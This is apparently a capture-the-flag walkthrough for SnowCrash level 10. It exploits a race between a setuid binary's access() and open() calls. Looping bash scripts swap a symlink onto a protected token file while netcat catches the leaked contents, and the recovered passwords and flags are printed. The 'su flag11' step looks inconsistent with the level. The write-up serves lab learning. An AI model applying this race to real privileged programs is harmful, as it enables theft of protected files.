# Level 10

- Once logged in, you will see a binary file `level10` and the `token` file.

```
???$ ssh level10@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level10@localhost's password:
level10@SnowCrash:~$ ls
level10  token
level10@SnowCrash:~$ ls -ls
total 16
12 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
 4 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Yes, it looks same is the previous line, but let's check what's the differernce.

```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$
```
there is a token, but the access is only granted for `flag10` user.

```
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

and check the binary
```
level10@SnowCrash:~$ strings level10
[...]
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
[...]
```

let's check how this works
```
level10@SnowCrash:~$ ltrace ./level10 token localhost
__libc_start_main(0x80486d4, 3, 0xbffff784, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                  = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)    = 31
+++ exited (status 31) +++
level10@SnowCrash:~$
```
Here, the `access` function is called, to check the permission of the file.

on manual of access `man 2 access`, the following is presented
```
ACCESS(2)                    Linux Programmer's Manual                   ACCESS(2)
...
NOTES
       Warning: Using access() to check if a user is authorized to,  for  example,
       open a file before actually doing so using open(2) creates a security hole,
       because the user might exploit the short time interval between checking and
       opening the file to manipulate it.  For this reason, the use of this system
       call should be avoided.  (In the example just described, a  safer  alterna-
       tive  would be to temporarily switch the process's effective user ID to the
       real ID and then call open(2).)
...
```
[`TOCTOU race`](https://stackoverflow.com/questions/7925177/access-security-hole) is mentioned about this security hole.

In order to capture the `smaall gap` in between `access()` and `open()` the following will be prompted.

First, run `netcat` on port `6969`

```
level10@SnowCrash:~$ nc -lk 6969
```

and creating and run script that symlinks with the `token` file,

```
#!/bin/bash

while true; do
        touch /tmp/symlink
        rm -f /tmp/symlink
        ln -s /home/user/level10/token /tmp/symlink
        rm -f /tmp/symlink
done
```

and execute the `level10` binary with symlink created

```
#!/bin/bash

while true; do
	./level10 /tmp/symlink 127.0.0.1;
done
```

and listen on the port `6969` for capturing any incoming data

```
level10@SnowCrash:~$ nc -lk 6969 &
[...]
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
[...]
```
with the flag achieved, let's try logging into `flag11`

```
level10@SnowCrash:~$ su flag11
Password:
Don't forget to launch getflag !
flag11@SnowCrash:~$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
flag11@SnowCrash:~$
```
